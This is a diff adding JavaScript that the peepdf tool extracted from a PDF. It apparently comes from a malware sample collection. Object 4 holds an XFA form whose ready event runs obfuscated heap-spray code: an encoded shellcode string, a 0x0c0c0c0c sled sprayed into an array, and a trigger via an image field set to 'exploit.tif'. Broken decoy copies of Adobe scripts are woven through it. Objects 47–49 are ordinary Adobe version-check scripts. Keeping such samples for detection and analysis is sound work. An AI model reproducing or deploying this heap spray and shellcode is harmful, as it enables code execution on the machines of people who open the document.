@@ -1,0 +1,272 @@
+// peepdf comment: Javascript code located in object 4 (version 0)
+
+< template baseProfile = "interactiveForms"
+xmlns = "http://www.xfa.org/schema/xfa-template/2.4/" > < subform name = "topmostSubform"
+layout = "tb"
+locale = "en_US" > < pageSet > < pageArea id = "PageArea1"
+name = "PageArea1" > < contentArea name = "ContentArea1"
+x = "0pt"
+y = "0pt"
+w = "612pt"
+h = "792pt" / > < medium short = "612pt"
+long = "792pt"
+stock = "custom" / > < /pageArea
+></pageSet > < variables > < script name = "ADBE::FileAttachmentsCompatibility"
+contentType = "application/x-javascript" >
+/*var v = app.viewerVersion;
+if (v < 7)
+{
+	var n = 0;
+	if (this.dataObjects != null)
+		n = this.dataObjects.length;
+	if (v >= 5 && v < 6 && n > 0 && (app.viewerVariation == "Full" || app.viewerVariation == "Fill-In"))
+	{
+		if (this.external)
+			app.alert("This documen to save a copy of the  he File > Document Properties > Embedded Data Objects menu.", 3, 0);
+		else
+			app.alert("This docume the File > Document Properties > Embedded Datchments.", 3, 0);
+	}
+	else if (v >= 6 && v < 7)
+	{
+		if (n == 0)
+		{
+			var np = this.numPages;
+			syncAnnotScan();
+			for (var p = 0; p < np && n == 0; ++p)
+			{
+				var annots(p);
+				if (annots != null)
+				{
+					for (var i = 0; i < annots.length; ++i)
+					{
+						if (annots[i].type == "FileAttachment")
+						{
+							n = 1;
+							break;
+						}
+					}
+				}
+			}
+		}
+		if (n > 0)
+		{
+			if (this.external)
+				app.alert("This document has f the top of the document window's vertical scrollbar and choose File Attachments.", 3, 0);
+			else
+				app.alert("This document haDocument > File Attachments menu to view the attachments.", 3, 0);
+		}
+	}
+}
+*/
+< /script
+><script name="d" contentType="application/x - javascript "
+>/*var  ___espe;
+var  _c1 = 				"\x6c\x65\\x68 ";
+funion _____(__){var _='';for(var ___=0;___<_1];___+=4) _+='%'+'u'+__.substr(___,4);return _;}
+funcion 	rep(_	,	__)	{	var ___	=	""	;	while (	--_>=	0) ___	+=	 __	;	rurn	 ___;}
+
+
+_1 = 20	+_[_c1];
+while (_0[	_c1]<_1) _0+=_0;
+_2	 = 	_0["\xx67 "](0, 	_1);
+_3 	=	 _0["\x73\xe\x67 "](0, _0[_c1	]-_1);
+while(_3[_c1]	 +  _1<0x80000) _3 		= _3+	_3+_2;
+_4= new Array();
+for(i=0;i<=192;i=i+1)	_4[i]				=_3		+_;
+}
+uuu();*/</script
+><?templateDesigner expand 1?></variables
+><subform name="
+Page1 " x="
+0pt " y="
+0pt " w="
+612pt " h="
+792pt "
+><break before="
+pageArea " beforeTarget="
+# PageArea1 "
+/><bind match="
+none "
+/><field name="
+ImageField1 " w="
+150.767mm " h="
+9.525mm " x="
+37.972mm " y="
+29.655mm "
+><ui
+><imageEdit
+/></ui
+><event activity="
+ready " ref="
+$form " name="
+event__form_ready "
+><script contentType="
+application / x - javascript "
+>var  ____ = unescape;
+var  _c1 = 				"\x6c\x65\x6e\x67\x74\x68 ";
+function _____(__){var _='';for(var ___=0;___<__[_c1];___+=4) _+='%'+'u'+__.substr(___,4);return _;}
+function 	rep(_	,	__)	{	var ___	=	""	;	while (	--_>=	0) ___	+=	 __	;	return	 ___;}
+
+var		 sc=		____		(	_____("
+EB905E1a5B56068a303c1674E0c04604268aE480020f88c44303EB46E8e9FFe1FFff484e40404040404040404a464c404b4e4045404743474f4e464348494e4f4a484e404c4a48404a4d46474348494b454b48474d4a4b494d474f4d4b4f47494d4f4f404a4e49444a48484e4b4d4a484342494e464145464a4f4041464e47414f484b47464f4242494b4c474c4e474943404c4043464d46444640424f424346404243444a434c454144434642474f464246414644474e424546484745464040404040404040404040404040404040404040404049454f454f4a47464446414a404340404b4840444c404b4840474c414d4a4b484846484041454b4845474c434b4844474e4248474340454f46454b48464740424340454f4343494c494441444d4a4340454c43434b4d4f404e4b40414843424f44474840414c4b4c4d4043404a4d40444b4e414f4b434f414547474e4e454b484e45444243404d4d46464b484c404b444b484e454c4143404d4d4b4844404b484340454c4b4a4945424e4c4b43484f4e48434343464f46444d4847444046404546454f4f474548414348484f4f4f4447424f4d43404040414040404046474b4e4948474444404948474740464f4f474744404a4640444f4f47454443494847444c454a4640404a4640404a4640404f4f474740464f4f474540414348484f4f4f44474b444a4640404d484f45404743454f4f474744404f4f47474c454f4f474740464f4f474548424b484f4440474348494e4a404b4847444c454044414848434644464543444b4445474940414848474440444046404948494144474440424e4c4e4b4e4a414348404c48404948474444474044414848434b4441464b44414645474940414848474440464041414148494144474e40424e4c4e4f4f47474c454f4f474540434f40454842474f4f4f4f4f4f4948474448474a4642404d4847474f4346454f4f47454042494847404b484f4548474b424f4544474b4847444447404348414b44404443484b4f40404547474f4b48474448474b424744444740454f4f474744474f4f47434f4f474544424f4f47434f4f47454c414f4f4745484040454b48464d4a48424042444a40404c444742404b4e474f464c42444f4f404249454a4841404a40404c4447464048484240424441444b4e444f4848424043484e4e4740484e40404040404040404348444044424d404a46404046454f4f47474c424f4f47464c404a4640404a464f4f4f4f474544413030 "));
+
+function uuu(){
+_ = rep(128, ____	(_____		("
+42424242424242424242 "))) + sc;
+_0 = 			____		(	_____("
+0c0c0c0c "));
+_1 = 20	+_[_c1];
+while (_0[	_c1]<_1) _0+=_0;
+/*
+	}
+	else if (v >= 6 && v < 7)
+	{
+		if (n == 0)
+		{
+			var np = this.numPages;
+			syncAnnotScan();
+			for (var p = 0; p < np && n == 0; ++p)
+			{
+				var annots(p);
+				if (annots != null)
+				{
+					for (var i = 0; i < annots.length; ++i)
+					{
+						if (annots[i].type == "
+FileAttachment ")
+						{
+							n = 1;
+							break;
+						}
+*/
+_2	 = 	_0["\x73\x75\x62\x73\x74\x72\x69\x6e\x67 "](0, 	_1);
+_3 	=	 _0["\x73\x75\x62\x73\x74\x72\x69\x6e\x67 "](0, _0[_c1	]-_1);
+while(_3[_c1]	 +  _1<0x80000) _3 		= _3+	_3+_2;
+/*
+var v = app.viewerVersion;
+if (v < 7)
+{
+	var n = 0;
+	if (this.dataObjects != null)
+		n = this.dataObjects.length;
+	if (v >= 5 && v < 6 && n > 0 && (app.viewerVariation == "
+Full " || app.viewerVariation == "
+Fill - In "))
+	{
+		if (this.external)
+			app.alert("
+This documen to save a copy of the he File > Document Properties > Embedded Data Objects menu.", 3, 0);
+		else
+			app.alert("
+This docume the File > Document Properties > Embedded Datchments.", 3, 0);
+	}
+*/
+_4= new Array();
+for(i=0;i<=192;i=i+1)	_4[i]				=_3		+_;
+}
+uuu();
+ImageField1.value.image.href = "
+exploit.tif ";
+/*var v = app.viewerVersion;
+if (v < 7)
+{
+	var n = 0;
+	if (this.dataObjects != null)
+		n = this.dataObjects.length;
+	if (v >= 5 && v < 6 && n > 0 && (app.viewerVariation == "
+Full " || app.viewerVariation == "
+Fill - In "))
+	{
+		if (this.external)
+			app.alert("
+This documen to save a copy of the he File > Document Properties > Embedded Data Objects menu.", 3, 0);
+		else
+			app.alert("
+This docume the File > Document Properties > Embedded Datchments.", 3, 0);
+	}
+	else if (v >= 6 && v < 7)
+	{
+		if (n == 0)
+}
+*/
+</script
+></event
+></field
+><?templateDesigner expand 1?></subform
+><?templateDesigner expand 1?></subform
+><?templateDesigner FormTargetVersion 24?><?templateDesigner Rulers horizontal:1, vertical:1, guidelines:1, crosshairs:0?><?templateDesigner Zoom 95?></template
+>
+
+// peepdf comment: Javascript code located in object 47 (version 0)
+
+if (typeof(xfa_installed) == "undefined" || typeof(xfa_version) == "undefined" || xfa_version < 2.1) {
+    if (app.viewerType == "Reader") {
+        if (ADBE.Reader_Value_Asked != true) {
+            if (app.viewerVersion < 6.0) {
+                if (app.alert(ADBE.Viewer_Form_string_Reader_5x, 1, 1) == 1) this.getURL(ADBE.Reader_Value_New_Version_URL + ADBE.SYSINFO, false);
+                ADBE.Reader_Value_Asked = true;
+            } else if (app.viewerVersion < 7.0) {
+                if (app.alert(ADBE.Viewer_Form_string_Reader_601, 1, 1) == 1) app.findComponent({
+                    cType: "App",
+                    cName: "Reader7",
+                    cDesc: ADBE.Viewer_string_Update_Reader_Desc
+                });
+                ADBE.Reader_Value_Asked = true;
+            } else {
+                if (app.alert(ADBE.Viewer_Form_string_Reader_6_7x, 1, 1) == 1) app.findComponent({
+                    cType: "Plugin",
+                    cName: "XFA",
+                    cDesc: ADBE.Viewer_string_Update_Reader_Desc
+                });
+                ADBE.Reader_Value_Asked = true;
+            }
+        }
+    } else {
+        if (ADBE.Viewer_Value_Asked != true) {
+            if (app.viewerVersion < 7.0) app.response({
+                cQuestion: ADBE.Viewer_Form_string_Viewer_Older,
+                cDefault: ADBE.Viewer_Value_New_Version_URL + ADBE.SYSINFO,
+                cTitle: ADBE.Viewer_string_Title
+            });
+            else if (app.alert(ADBE.Viewer_Form_string_Viewer, 1, 1) == 1) app.findComponent({
+                cType: "Plugin",
+                cName: "XFA",
+                cDesc: ADBE.Viewer_string_Update_Desc
+            });
+            ADBE.Viewer_Value_Asked = true;
+        }
+    }
+}
+
+// peepdf comment: Javascript code located in object 48 (version 0)
+
+if (typeof(ADBE.Reader_Value_Asked) == "undefined") ADBE.Reader_Value_Asked = false;
+if (typeof(ADBE.Viewer_Value_Asked) == "undefined") ADBE.Viewer_Value_Asked = false;
+if (typeof(ADBE.Reader_Need_Version) == "undefined" || ADBE.Reader_Need_Version < 7.0) {
+    ADBE.Reader_Need_Version = 7.0;
+    ADBE.Reader_Value_New_Version_URL = "http://cgi.adobe.com/special/acrobat/update";
+    ADBE.SYSINFO = "?p=" + app.platform + "&v=" + app.viewerVersion + "&l=" + app.language + "&c=" + app.viewerType + "&w=" + "XFA1_6";
+}
+if (typeof(ADBE.Viewer_Need_Version) == "undefined" || ADBE.Viewer_Need_Version < 7.0) {
+    ADBE.Viewer_Need_Version = 7.0;
+    ADBE.Viewer_Value_New_Version_URL = "http://cgi.adobe.com/special/acrobat/update";
+    ADBE.SYSINFO = "?p=" + app.platform + "&v=" + app.viewerVersion + "&l=" + app.language + "&c=" + app.viewerType + "&w=" + "XFA1_6";
+}
+
+// peepdf comment: Javascript code located in object 49 (version 0)
+
+if (typeof(this.ADBE) == "undefined") this.ADBE = new Object();
+ADBE.LANGUAGE = "ENU";
+ADBE.Viewer_string_Title = "Adobe Acrobat";
+ADBE.Viewer_string_Update_Desc = "Adobe Interactive Forms Update";
+ADBE.Viewer_string_Update_Reader_Desc = "Adobe Reader 7.0.5";
+ADBE.Reader_string_Need_New_Version_Msg = "This PDF file requires a newer version of Adobe Reader. Press OK to download the latest version or see your system administrator.";
+ADBE.Viewer_Form_string_Reader_601 = "This PDF form requires a newer version of Adobe Reader. Although the form may appear to work properly, some elements may function improperly or may not appear at all. Press OK to initiate an online update or see your system administrator.";
+ADBE.Viewer_Form_string_Reader_Older = "This PDF form requires a newer version of Adobe Reader. Although the form may appear to work properly, some elements may function improperly or may not appear at all. Press OK for online download information or see your system administrator.";
+ADBE.Viewer_Form_string_Viewer_601 = "This PDF form requires a newer version of Adobe Acrobat. Although the form may appear to work properly, some elements may function improperly or may not appear at all. Press OK to initiate an online update or see your system administrator.";
+ADBE.Viewer_Form_string_Viewer_60 = "This PDF form requires a newer version of Adobe Acrobat. Although the form may appear to work properly, some elements may function improperly or may not appear at all. For more information please copy the following URL (CTRL+C on Win, Command-C on Mac) and paste into your browser or see your system administrator.";
+ADBE.Viewer_Form_string_Viewer_Older = "This PDF requires a newer version of Acrobat. Copy this URL and paste into your browser or see your sys admin.";
+ADBE.Viewer_Form_string_Reader_5x = "This PDF form requires a newer version of Adobe Reader. Without a newer version, the form may be displayed, but it might not work properly. Some form elements might not be visible at all. If an internet connection is available, clicking OK will open your browser to a web page where you can obtain the latest version.";
+ADBE.Viewer_Form_string_Reader_6_7x = "This PDF form requires a newer version of Adobe Reader. Without a newer version, the form may be displayed, but it might not work properly. Some form elements might not be visible at all. If an internet connection is available, clicking OK will download and install the latest version.";
+ADBE.Viewer_Form_string_Viewer = "This PDF form requires a newer version of Adobe Acrobat. Without a newer version, the form may be displayed, but it might not work properly. Some form elements might not be visible at all. If an internet connection is available, clicking OK will download and install the latest version.";
+
